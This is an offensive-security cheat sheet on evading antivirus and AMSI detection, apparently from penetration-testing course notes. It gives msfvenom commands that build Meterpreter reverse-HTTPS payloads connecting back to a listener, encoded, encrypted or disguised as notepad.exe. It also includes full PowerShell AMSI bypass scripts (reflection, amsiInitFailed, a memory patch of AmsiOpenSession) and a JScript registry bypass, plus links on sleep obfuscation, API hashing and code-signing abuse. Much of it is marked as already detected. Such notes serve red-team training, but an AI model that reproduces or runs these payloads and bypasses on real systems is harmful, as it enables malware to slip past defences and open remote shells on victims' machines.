## Locating Signatures in Files (try bypass signature based detection)

To begin, let’s discuss the process of bypassing antivirus signature detection.


#### msf encoders (busted)

- msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o /var/www/html/met.exe

- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o /var/www/html/met64_zutto.exe


Use the -x option to specify a different template. To do this, we’ll copy the notepad application located at C:\Windows\System32\notepad.exe to Kali and use it as a template as follows:

- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o /var/www/html/met64_notepad.exe


#### msf encryptors (busted)

- msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /var/www/html/met64_aes.exe



#### Encrypting/Econde Shellcode Runner

- Caesae Chiper shellcode Helper.cs file
- https://redsiege.com/adventures-in-shellcode-obfuscation/
- https://medium.com/@sam.rothlisberger/manual-indirect-syscalls-and-obfuscation-for-shellcode-execution-bb589148e56f
- https://www.thehacker.recipes/evasion/av/obfuscation
- https://nirajkharel.com.np/posts/payload-encryption-staging/


## Behavior or heuristic detection

#### Sleep Obfuscation

- https://dtsec.us/2023-04-24-Sleep/
- https://github.com/c3l3si4n/windows_sleep_techniques
- https://havocframework.com/docs/agent
- vxug techniques


## Non-emulated APIs


## Function Call Obfs / API Hashing

- https://medium.com/@irfanbhat3/function-call-obfuscation-1bcd58e62b8e
- https://trikkss.github.io/posts/hiding_windows_api_calls_part1/
- https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware


## code signing bypass

- https://axelarator.github.io/posts/codesigningcerts/
- https://freedium.cfd/https://medium.com/@s12deff/bypass-antivirus-with-binary-signing-certificates-87204bf80a57
- https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1553-subvert-trust-controls/code-signing
- http://web.archive.org/web/20201108161727/https://labs.f-secure.com/archive/masquerading-as-a-windows-system-binary-using-digital-signatures/


## AMSI (Antimalware Scan Interface)

To protect against malicious PowerShell scripts, Microsoft introduced the Antimalware Scan Interface to allow run-time inspection of all PowerShell commands or scripts. At a high level, AMSI captures every PowerShell, Jscript, VBScript, VBA, or .NET command or script at run-time and passes it to the local antivirus software for inspection.

- bypass with reflection in powershell (busted)
```
PS C:\Users\Offsec> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

- Attacking Initialization (busted)
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

- Patching AMSI AmsiOpenSession (busted)
```
# Author: Matheus Alexandre, https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
function lookFuncAddr{
Param($moduleName, $functionName)

$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType{
Param(
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)

$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

return $type.CreateType()
}

[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
$oldProtect = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)

$3b = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)

$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
```


- JScript bypass setting a registry key (use DotnettoJscrip to convert C# to JS)

```
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
var AmsiEnable = sh.RegRead(key);
if(AmsiEnable!=0){
throw new Error(1, '');
}
}catch(e){
sh.RegWrite(key, 0, "REG_DWORD");
sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}
"+WScript.ScriptFullName,0,1);
sh.RegWrite(key, 1, "REG_DWORD");
WScript.Quit(1);
}
```